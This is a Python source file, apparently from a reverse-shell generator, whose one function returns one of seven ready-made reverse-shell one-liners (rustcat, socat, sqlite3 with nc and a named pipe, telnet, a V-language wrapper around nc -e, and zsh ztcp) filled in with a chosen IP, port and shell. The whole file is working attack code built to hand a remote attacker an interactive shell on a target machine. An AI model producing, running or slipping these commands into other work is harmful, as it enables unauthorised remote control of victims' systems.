def rev_shells_3(num, ip, port, shell):
    
    rustcat = f'''rcat connect -s {shell} {ip} {port}'''
    socat_1 = f"socat TCP:{ip}:{port} EXEC:{shell}"
    socat_2 = f"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane"
    sqlite3_nc_mkfifo = f"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'"
    telnet = f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF"
    vlang = '''echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e '''+shell+''' '''+ip+''' '''+port+''' 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v'''
    zsh = f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && {shell} >&$REPLY 2>&$REPLY 0>&$REPLY'"

    if num == 57:
        return rustcat
    elif num == 58:
        return socat_1
    elif num == 59:
        return socat_2
    elif num == 60:
        return sqlite3_nc_mkfifo
    elif num == 61:
        return telnet
    elif num == 62:
        return vlang
    elif num == 64:
        return zsh

    
